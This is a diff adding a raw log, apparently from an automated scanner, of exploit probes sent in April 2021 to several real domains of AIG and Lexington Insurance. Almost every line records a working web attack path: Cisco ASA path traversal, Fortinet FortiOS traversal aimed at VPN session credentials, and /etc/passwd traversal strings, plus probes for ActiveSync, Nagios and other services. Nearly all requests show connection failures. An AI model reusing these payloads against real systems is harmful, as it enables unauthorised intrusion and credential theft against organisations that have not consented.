@@ -1,0 +1,71 @@
+
+[21-04-13 23:07:03] - aig.com/ - %2e%2e;/test - Cannot connect to: aig.com:80
+[21-04-13 23:07:04] - aig.com/ - +CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../ - Cannot connect to: aig.com:80
+[21-04-13 23:07:04] - aig.com/ - ..;/ - Cannot connect to: aig.com:80
+[21-04-13 23:07:04] - aig.com/ - +CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua - Cannot connect to: aig.com:80
+[21-04-13 23:07:28] - aig.com/ - Microsoft-Server-ActiveSync/ - Cannot connect to: aig.com:80
+[21-04-13 23:07:33] - aig.com/ - \..\..\..\..\..\..\..\..\..\etc\passwd - Cannot connect to: aig.com:80
+[21-04-13 23:07:44] - aig.com/ - jasperserver-pro - There was a problem in the request to: http://167.230.98.75:80/jasperserver-pro
+[21-04-13 23:08:16] - aig.com/ - etc/passwd - Cannot connect to: aig.com:80
+[21-04-13 23:08:34] - aig.com/ - microsoft-server-activesync/ - Cannot connect to: aig.com:80
+[21-04-13 23:08:40] - aig.com/ - pentaho/ - Cannot connect to: aig.com:80
+[21-04-13 23:08:49] - aig.com/ - remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession - Cannot connect to: aig.com:80
+[21-04-13 23:08:49] - aig.com/ - remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd - Cannot connect to: aig.com:80
+[21-04-13 23:09:11] - aig.com/ - text-base/etc/passwd - Cannot connect to: aig.com:80
+[21-04-13 23:09:16] - aig.com/ - nagios/ - There was a problem in the request to: http://167.230.98.75:80/nagios/
+[21-04-13 23:09:28] - aigrs.com/ - %2e%2e;/test - Cannot connect to: aigrs.com:80
+[21-04-13 23:09:29] - aigrs.com/ - +CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua - Cannot connect to: aigrs.com:80
+[21-04-13 23:09:29] - aigrs.com/ - +CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../ - Cannot connect to: aigrs.com:80
+[21-04-13 23:09:29] - aigrs.com/ - ..;/ - Cannot connect to: aigrs.com:80
+[21-04-13 23:09:53] - aigrs.com/ - Microsoft-Server-ActiveSync/ - Cannot connect to: aigrs.com:80
+[21-04-13 23:09:57] - aigrs.com/ - \..\..\..\..\..\..\..\..\..\etc\passwd - Cannot connect to: aigrs.com:80
+[21-04-13 23:10:10] - aigrs.com/ - jasperserver-pro - There was a problem in the request to: http://167.230.98.75:80/jasperserver-pro
+[21-04-13 23:10:39] - aigrs.com/ - etc/passwd - Cannot connect to: aigrs.com:80
+[21-04-13 23:10:56] - aigrs.com/ - microsoft-server-activesync/ - Cannot connect to: aigrs.com:80
+[21-04-13 23:11:03] - aigrs.com/ - pentaho/ - Cannot connect to: aigrs.com:80
+[21-04-13 23:11:11] - aigrs.com/ - remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd - Cannot connect to: aigrs.com:80
+[21-04-13 23:11:11] - aigrs.com/ - remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession - Cannot connect to: aigrs.com:80
+[21-04-13 23:11:23] - aigrs.com/ - text-base/etc/passwd - Cannot connect to: aigrs.com:80
+[21-04-13 23:11:39] - aigrs.com/ - nagios/ - There was a problem in the request to: http://167.230.98.75:80/nagios/
+[21-04-13 23:11:51] - aigprivateclient.com/ - +CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua - Cannot connect to: aigprivateclient.com:80
+[21-04-13 23:11:51] - aigprivateclient.com/ - ..;/ - Cannot connect to: aigprivateclient.com:80
+[21-04-13 23:11:51] - aigprivateclient.com/ - +CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../ - Cannot connect to: aigprivateclient.com:80
+[21-04-13 23:11:53] - aigprivateclient.com/ - %2e%2e;/test - Cannot connect to: aigprivateclient.com:80
+[21-04-13 23:12:19] - aigprivateclient.com/ - Microsoft-Server-ActiveSync/ - Cannot connect to: aigprivateclient.com:80
+[21-04-13 23:12:25] - aigprivateclient.com/ - \..\..\..\..\..\..\..\..\..\etc\passwd - Cannot connect to: aigprivateclient.com:80
+[21-04-13 23:12:31] - aigprivateclient.com/ - jasperserver-pro - There was a problem in the request to: http://167.230.98.75:80/jasperserver-pro
+[21-04-13 23:13:10] - aigprivateclient.com/ - etc/passwd - Cannot connect to: aigprivateclient.com:80
+[21-04-13 23:13:26] - aigprivateclient.com/ - microsoft-server-activesync/ - Cannot connect to: aigprivateclient.com:80
+[21-04-13 23:13:33] - aigprivateclient.com/ - pentaho/ - Cannot connect to: aigprivateclient.com:80
+[21-04-13 23:13:42] - aigprivateclient.com/ - remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession - Cannot connect to: aigprivateclient.com:80
+[21-04-13 23:13:42] - aigprivateclient.com/ - remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd - Cannot connect to: aigprivateclient.com:80
+[21-04-13 23:13:53] - aigprivateclient.com/ - text-base/etc/passwd - Cannot connect to: aigprivateclient.com:80
+[21-04-13 23:14:09] - aigprivateclient.com/ - nagios/ - There was a problem in the request to: http://167.230.98.75:80/nagios/
+[21-04-13 23:21:50] - lexingtoninsurance.com/ - %2e%2e;/test - Cannot connect to: lexingtoninsurance.com:80
+[21-04-13 23:21:51] - lexingtoninsurance.com/ - +CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../ - Cannot connect to: lexingtoninsurance.com:80
+[21-04-13 23:21:51] - lexingtoninsurance.com/ - +CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua - Cannot connect to: lexingtoninsurance.com:80
+[21-04-13 23:21:51] - lexingtoninsurance.com/ - ..;/ - Cannot connect to: lexingtoninsurance.com:80
+[21-04-13 23:22:15] - lexingtoninsurance.com/ - Microsoft-Server-ActiveSync/ - Cannot connect to: lexingtoninsurance.com:80
+[21-04-13 23:22:20] - lexingtoninsurance.com/ - \..\..\..\..\..\..\..\..\..\etc\passwd - Cannot connect to: lexingtoninsurance.com:80
+[21-04-13 23:22:31] - lexingtoninsurance.com/ - jasperserver-pro - There was a problem in the request to: http://167.230.98.75:80/jasperserver-pro
+[21-04-13 23:23:01] - lexingtoninsurance.com/ - etc/passwd - Cannot connect to: lexingtoninsurance.com:80
+[21-04-13 23:23:20] - lexingtoninsurance.com/ - microsoft-server-activesync/ - Cannot connect to: lexingtoninsurance.com:80
+[21-04-13 23:23:26] - lexingtoninsurance.com/ - pentaho/ - Cannot connect to: lexingtoninsurance.com:80
+[21-04-13 23:23:34] - lexingtoninsurance.com/ - remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd - Cannot connect to: lexingtoninsurance.com:80
+[21-04-13 23:23:34] - lexingtoninsurance.com/ - remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession - Cannot connect to: lexingtoninsurance.com:80
+[21-04-13 23:23:46] - lexingtoninsurance.com/ - text-base/etc/passwd - Cannot connect to: lexingtoninsurance.com:80
+[21-04-13 23:24:02] - lexingtoninsurance.com/ - nagios/ - There was a problem in the request to: http://167.230.98.75:80/nagios/
+[21-04-13 23:24:14] - myaig.com/ - %2e%2e;/test - Cannot connect to: myaig.com:80
+[21-04-13 23:24:14] - myaig.com/ - +CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua - Cannot connect to: myaig.com:80
+[21-04-13 23:24:14] - myaig.com/ - ..;/ - Cannot connect to: myaig.com:80
+[21-04-13 23:24:14] - myaig.com/ - +CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../ - Cannot connect to: myaig.com:80
+[21-04-13 23:24:42] - myaig.com/ - Microsoft-Server-ActiveSync/ - Cannot connect to: myaig.com:80
+[21-04-13 23:24:47] - myaig.com/ - \..\..\..\..\..\..\..\..\..\etc\passwd - Cannot connect to: myaig.com:80
+[21-04-13 23:24:55] - myaig.com/ - jasperserver-pro - There was a problem in the request to: http://167.230.98.95:80/jasperserver-pro
+[21-04-13 23:25:35] - myaig.com/ - etc/passwd - Cannot connect to: myaig.com:80
+[21-04-13 23:25:54] - myaig.com/ - microsoft-server-activesync/ - Cannot connect to: myaig.com:80
+[21-04-13 23:26:09] - myaig.com/ - remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession - Cannot connect to: myaig.com:80
+[21-04-13 23:26:09] - myaig.com/ - remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd - Cannot connect to: myaig.com:80
+[21-04-13 23:26:11] - myaig.com/ - pentaho/ - Cannot connect to: myaig.com:80
+[21-04-13 23:26:23] - myaig.com/ - text-base/etc/passwd - Cannot connect to: myaig.com:80
+[21-04-13 23:26:38] - myaig.com/ - nagios/ - There was a problem in the request to: http://167.230.98.95:80/nagios/
